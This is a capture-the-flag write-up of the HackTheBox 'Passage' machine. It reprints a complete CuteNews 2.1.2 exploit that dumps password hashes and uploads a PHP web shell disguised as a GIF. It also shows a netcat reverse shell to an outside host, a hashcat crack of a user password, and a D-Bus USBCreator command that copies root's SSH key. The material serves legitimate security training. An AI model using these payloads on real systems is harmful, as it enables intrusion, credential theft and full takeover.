---
layout: post
title: "Passage - HackTheBox"
permalink: "/passage-hackthebox"
color: rgb(16, 55, 84)
excerpt_separator: <!--more-->
author: ritiksahni
tags: [HackTheBox, DBUS, RCE, IPC, Web]
---

Passage is an interesting linux machine, it takes us through exploiting an RCE in CuteNews 2.1.2 content management system to exploiting USB-Creator D-Bus interface to gain root access.

<!--more-->

<center><img src="/assets/img/posts/passage-htb/passage-header.png"></center><br>


# Contents
* [Port Scanning](#port-scanning)
* [HTTP](#http)
    * [Understanding the Exploit (CVE-2019-11447)](#understanding-exploit)
* [Exploitation](#exploitation)
* [PrivEsc to Paul](#privesc-paul)
* [PrivEsc to Nadav](#privesc-nadav)
* [PrivEsc to root](#privesc-root)
    * [Understanding D-Bus](#dbus-info)

## Port Scanning <a name="port-scanning">

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-09 08:02 IST
Nmap scan report for 10.10.10.206
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.61 seconds
```

We got SSH (port 22) and HTTP (port 80) open.

---

## HTTP <a name="http">

Opening `http://10.10.10.206` in browser gives us the homepage of `Passage News`.

![port-80-homepage](assets/img/posts/passage-htb/web-80-homepage.png)

Observing the footer, we get `CuteNews` and searching on google tells us that it is a news/content management system. The version 2.1.2 is vulnerable to RCE (CVE-2019-11447).

The public exploit for the same is available at https://www.exploit-db.com/exploits/48800

Let's understand the exploit here:

#### Understanding the Exploit (CVE-2019-11447) <a name="understanding-exploit">

There are 3 major functions in the python exploit:

extract_credentials

```python

def extract_credentials():
    global sess, ip
    url = f"{ip}/CuteNews/cdata/users/lines"
    encoded_creds = sess.get(url).text
    buff = io.StringIO(encoded_creds)
    chash = buff.readlines()
    if "Not Found" in encoded_creds:
            print ("[-] No hashes were found skipping!!!")
            return
    else:
        for line in chash:
            if "<?php die('Direct call - access denied'); ?>" not in line:
                credentials = b64decode(line)
                try:
                    sha_hash = re.search('"pass";s:64:"(.*?)"', credentials.decode()).group(1)
                    print (sha_hash)
                except:
                    pass
```

This part of exploit establishes a session with the given URL and looks for the path `/CuteNews/cdata/users/lines`, this path is where there are base64 encoded credentials stored in `CuteNews 2.1.2`. After it gets the encoded creds, it tries to base64 decode it and prints it in simple and readable form. The variable name suggests that the decoded credentials are not plain text but are SHA hashed (SHA256 to be precise).

---

register
```python


def register():
    global sess, ip
    userpass = "".join(random.SystemRandom().choice(string.ascii_letters + string.digits ) for _ in range(10))
    postdata = {
        "action" : "register",
        "regusername" : userpass,
        "regnickname" : userpass,
        "regpassword" : userpass,
        "confirm" : userpass,
        "regemail" : f"{userpass}@hack.me"
    }
    register = sess.post(f"{ip}/CuteNews/index.php?register", data = postdata, allow_redirects = False)
    if 302 == register.status_code:
        print (f"[+] Registration successful with username: {userpass} and password: {userpass}")
    else:
        sys.exit()
```

This part of the exploit creates a random string and uses it as the credentials to create a new account on `CuteNews 2.1.2` powered website.

---

send_payload
```python

payload = "GIF8;\n<?php system($_REQUEST['cmd']) ?>"

def send_payload(payload):
    global ip
    token = sess.get(f"{ip}/CuteNews/index.php?mod=main&opt=personal").text
    signature_key = re.search('signature_key" value="(.*?)"', token).group(1)
    signature_dsi = re.search('signature_dsi" value="(.*?)"', token).group(1)
    logged_user = re.search('disabled="disabled" value="(.*?)"', token).group(1)
    print (f"signature_key: {signature_key}")
    print (f"signature_dsi: {signature_dsi}")
    print (f"logged in user: {logged_user}")

    files = {
        "mod" : (None, "main"),
        "opt" : (None, "personal"),
        "__signature_key" : (None, f"{signature_key}"),
        "__signature_dsi" : (None, f"{signature_dsi}"),
        "editpassword" : (None, ""),
        "confirmpassword" : (None, ""),
        "editnickname" : (None, logged_user),
        "avatar_file" : (f"{logged_user}.php", payload),
        "more[site]" : (None, ""),
        "more[about]" : (None, "")
    }
    payload_send = sess.post(f"{ip}/CuteNews/index.php", files = files).text
    print("============================\nDropping to a SHELL\n============================")
    while True:
        print ()
        command = input("command > ")
        postdata = {"cmd" : command}
        output = sess.post(f"{ip}/CuteNews/uploads/avatar_{logged_user}_{logged_user}.php", data=postdata)
        if 404 == output.status_code:
            print ("sorry i can't find your webshell try running the exploit again")
            sys.exit()
        else:
            output = re.sub("GIF8;", "", output.text)
            print (output.strip())

if __name__ == "__main__":
    print ("================================================================\nUsers SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN\n================================================================")
    extract_credentials()
    print ("================================================================")
    print()
    print ("=============================\nRegistering a users\n=============================")
    register()
    print()
    print("=======================================================\nSending Payload\n=======================================================")
    send_payload(payload)
    print ()
```

This part of the exploit sends a GET request to `/CuteNews/index.php?mod=main&opt=personal` and searches for `signature_dsi`, `signature_key`, `logged_user` in the response using `re` python module. The signatures are required for updating the profile in `CuteNews`.

The variable `payload` has a PHP payload which system commands with the value supplied in 'cmd' GET parameter but to upload this file, payload has `GIF8` and this bypasses the file uploading checks by adding GIF machine bytes and the arbitrary PHP file is uploaded by tricking the server into uploading a GIF file.

---

## Exploitation <a name="exploitation">
`python3 exploit.py`

![exploit.py](assets/img/posts/passage-htb/cutenews-rce-exploit.png)

Running the exploit allows us to run system commands but to have an actual shell I used netcat listener and sent /bin/sh from the passage box.


```bash
# Host machine

nc -lvnp 9000


# Victim machine

nc 10.14.10.44 9000 -e /bin/sh
```

Stabilizing shell in netcat

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl^Z
fg
[Enter]x2
```

We now have a stable and interactive shell over the box.

---

## Privilege Escalation to Paul <a name="privesc-paul">

While running our CuteNews exploit, we got some SHA256 hashes as identified by `hashid`. We can crack those using tools like hashcat.


Hashes:

```
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
```


```bash
hashcat -m1400 sha_hashes.txt --wordlist /opt/wordlists/rockyou.txt
```

We get cracked password of only one hash which is `e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1`

We can use this password to switch user to paul from www-data using `su paul`.

![su-paul](assets/img/posts/passage-htb/su-paul.png)

---

## Privilege Escalation to Nadav <a name="privesc-nadav">

After we get user, we can see that there is /home/paul/.ssh/authorized_keys and nadav is allowed to SSH into paul.

With this logic we can try to straight up login into nadav using SSH without any password.

> Make sure to SSH from the victim box itself as only Paul is having access to SSH into nadav, we don't ;-)

![ssh-nadav](assets/img/posts/passage-htb/ssh-nadav.png)


We are in! Time to finally gain root and here comes the most interesting part...

## Privilege Escalation to root <a name="privesc-root">

Running `ps aux` on the machine we can see several different processes running on the machine and one of them is the way to go. A process which runs `python3 /usr/share/usb-creator/usb-creator-helper`.

Searching on google about `usb-creator-helper` lands us to an awesome article https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/ 

The above article explains how USB-Creator D-Bus interface is vulnerable to privilege escalation in Ubuntu.


---
#### Understanding D-Bus <a name="dbus-info">


Ubuntu uses D-Bus for IPC ([Interprocess Communication](https://en.wikipedia.org/wiki/Inter-process_communication)).

D-Bus is a message bus, it is used for IPC (interprocess communication)

Processes connect to the message bus daemon and exchange messages. The buses can be analyzed using a tool called “D-Feet”.

There are two standard instances of DBus daemon:

- System Bus
   → It can be used to broadcast messages like adding print queue, adding/removing devices and connects with major components of the computer system.
		
- Session Bus
   → It is used by applications in user login sessions and data is shared while it's integrated with user's desktop. For example, movie players can send a D-Bus message to prevent the screensaver from activating while the user is watching a movie.

---

We can use the following command to copy /root/.ssh/id_rsa to /tmp/id_rsa and SSH into root using the private key we just copied using USBCreator exploitation.

```bash
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_rsa true
cat /tmp/id_rsa
ssh -i /tmp/id_rsa root@localhost
```

![rooted](assets/img/posts/passage-htb/rooted-box.png)




---

**I hope you enjoyed the writeup and learnt new stuff! Feel free to message me on my socials for feedback/suggestions. [Contact Me](/contact)**

Thank you for reading!

[Back to Top](#top)